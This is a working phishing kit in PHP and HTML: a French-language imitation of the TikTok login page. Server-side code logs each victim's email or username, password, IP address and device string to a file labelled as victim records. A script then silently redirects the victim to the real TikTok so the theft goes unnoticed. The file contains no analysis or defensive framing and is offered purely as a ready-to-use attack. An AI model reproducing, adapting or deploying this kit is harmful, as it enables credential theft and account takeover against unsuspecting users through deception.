<?php
if ($_POST) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'inconnue';
    $ip = trim(explode(',', $ip)[0]);

    $email = $_POST['email'] ?? '';
    $pass  = $_POST['password'] ?? '';
    $ua    = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150);
    $time  = date('Y-m-d H:i:s');

    $log  = "┌─────────────────────────────────────────\n";
    $log .= "│ 🎯 TIKTOK VICTIME — {$time}\n";
    $log .= "├─────────────────────────────────────────\n";
    $log .= "│ 📧 EMAIL/USER : {$email}\n";
    $log .= "│ 🔑 MOT DE PASSE : {$pass}\n";
    $log .= "│ 🌐 ADRESSE IP   : {$ip}\n";
    $log .= "│ 📱 APPAREIL     : {$ua}\n";
    $log .= "└─────────────────────────────────────────\n";

    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    // Redirection vers TikTok (permet à la victime de voir la vraie page)
    header('Location: https://www.tiktok.com/');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Connexion</title>
    <style>
        /* TikTok CSS Clone - Responsive */
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .login-container {
            text-align: center;
            width: 100%;
            max-width: 300px;
            padding: 20px;
        }
        
        .logo {
            font-size: 42px;
            font-weight: 700;
            margin-bottom: 30px;
            letter-spacing: -1px;
        }
        
        .logo span {
            color: #25f4ee;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .input-field {
            width: 100%;
            padding: 14px 16px;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            background-color: #272727;
            color: #fff;
            box-sizing: border-box;
        }
        
        .input-field::placeholder {
            color: #8e8e8e;
        }
        
        .input-field:focus {
            outline: none;
            background-color: #333;
        }
        
        .submit-btn {
            background-color: #25f4ee;
            color: #000;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            padding: 14px 16px;
            margin-top: 8px;
            opacity: 0.8;
            transition: opacity 0.2s;
        }
        
        .submit-btn:hover {
            opacity: 1;
        }
        
        .options {
            margin-top: 20px;
            font-size: 14px;
            color: #8e8e8e;
        }
        
        .options a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 12px;
        }
        
        .options a:hover {
            color: #fff;
        }
        
        .footer {
            margin-top: 30px;
            font-size: 13px;
            color: #8e8e8e;
        }
        
        .footer a {
            color: #fff;
            font-weight: 600;
            text-decoration: none;
        }
        
        .signup-link {
            color: #25f4ee;
            font-weight: 600;
            text-decoration: none;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .login-container {
                max-width: 280px;
                padding: 16px;
            }
            .logo {
                font-size: 36px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">tiktok<span>.</span></div>
        <form class="login-form" method="POST" action="tiktoklogin.php">
            <input type="text" name="email" class="input-field" placeholder="Nom d'utilisateur, email ou téléphone" required>
            <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
            <button type="submit" class="submit-btn">Se connecter</button>
        </form>
        <div class="options">
            <a href="#">Mot de passe oublié ?</a>
            <a href="#">Besoin d'aide ?</a>
        </div>
        <div class="footer">
            Vous n'avez pas de compte ? <a href="#" class="signup-link">S'inscrire</a>
        </div>
    </div>

    <script>
        // Script pour rediriger après capture
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = new FormData(this);
            fetch(this.action, {
                method: 'POST',
                body: formData
            })
            .then(() => {
                window.location.href = 'https://www.tiktok.com/';
            });
        });
    </script>
</body>
</html>
